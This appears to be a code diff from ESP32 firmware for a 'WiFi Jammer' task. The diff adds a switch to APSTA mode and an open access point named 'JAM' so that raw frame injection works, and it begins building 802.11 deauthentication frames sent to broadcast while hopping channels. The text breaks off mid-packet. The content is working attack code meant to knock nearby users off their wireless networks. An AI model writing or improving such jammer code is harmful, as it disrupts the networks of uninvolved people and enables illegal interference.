@@ -25,15 +25,28 @@ static void jammer_wifi_func(void *params) {
     jammer_wifi_running = true;
     ESP_LOGI(TAG, "🔥 WiFi Jammer started — flooding all channels");
 
-    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-    uint8_t bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
-    int ch = 1;
-
-    if (bw16_is_connected()) bw16_jammer_start();
-
-    while (jammer_wifi_running) {
-        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-        esp_rom_delay_us(50);
+    // FIX: WiFi mode check — esp_wifi_80211_tx() কাজ করার জন্য AP বা APSTA মোড প্রয়োজন
+    wifi_mode_t current_mode;
+    esp_wifi_get_mode(&current_mode);
+    if (current_mode != WIFI_MODE_AP && current_mode != WIFI_MODE_APSTA) {
+        ESP_LOGW(TAG, "WiFi mode %d not suitable for jamming. Switching to APSTA...", current_mode);
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
+        vTaskDelay(pdMS_TO_TICKS(100));
+        
+        // Start minimal AP so frame injection works
+        wifi_config_t ap_cfg = {
+            .ap = {
+                .ssid = "JAM",
+                .ssid_len = 3,
+                .channel = 1,
+                .authmode = WIFI_AUTH_OPEN,
+                .max_connection = 0,
+                .beacon_interval = 1000,
+            }
+        };
+        esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+        esp_wifi_start();
+        vTaskDelay(pdMS_TO_TICKS(200));
 
         uint8_t deauth_pkt[26] = {
             0xC0, 0x00, 0x00, 0x00,
